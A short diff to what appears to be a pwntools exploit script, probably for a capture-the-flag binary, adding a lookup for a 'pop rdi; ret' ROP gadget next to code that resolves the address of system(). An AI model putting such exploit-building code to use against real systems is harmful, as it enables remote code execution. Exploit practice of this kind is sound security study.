@@ -19,7 +19,9 @@ log.info('Get Addresses')
 info("%#x system", elf.symbols.system)
 system_address = p64(elf.symbols.system)
 
-
+rop = ROP(elf)
+POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
+info("%#x POP RDI", POP_RDI)
 
 log.info('Create IO')
 #io = remote('', )
